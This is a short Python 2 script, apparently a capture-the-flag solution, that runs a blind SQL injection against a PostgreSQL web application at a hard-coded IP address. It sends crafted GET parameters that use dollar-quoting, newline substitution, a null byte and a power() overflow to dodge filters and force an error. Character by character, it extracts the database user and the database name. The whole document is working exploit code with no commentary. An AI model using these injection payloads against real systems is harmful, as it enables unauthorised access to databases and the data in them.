import requests
import string

passchars = string.ascii_letters + string.digits

url = "http://35.224.182.105/"

def get_user():
	username = ""
	for j in range(1,13):
		for i in passchars:
			query = url + "/?name=$$a$$||$$dmi$$||$$n$$&column=power((case%0awhen%0a(lpad(current_user,"+str(j)+",$$$$)=$$" + username + i +"$$)%0athen%0a1%0aelse%0a0%0aend)%2B1,222222222222222222);%00"
			req = requests.get(query)
			if "Having a query problem" in req.text:
				username += i+"$$||$$"
				print username
				break
			#print i

	return username.replace("$","").replace("|","")

def get_database():
	db_name = ""
	for j in range (1,9):
		for i in passchars:
			query = url + "/?name=$$a$$||$$dmi$$||$$n$$&column=power((case%0awhen%0a(lpad(current_database()," +str(j) + ",$$$$)=$$" + db_name + i + "$$)%0athen%0a1%0aelse%0a0%0aend)%2B1,222222222222222222);%00"
			req = requests.get(query)
			if "Having a query problem" in req.text:
                                db_name += i
                                print db_name
                                break
                        #print i
	return db_name


print "Username: " + get_user()
print "Database: " + get_database()

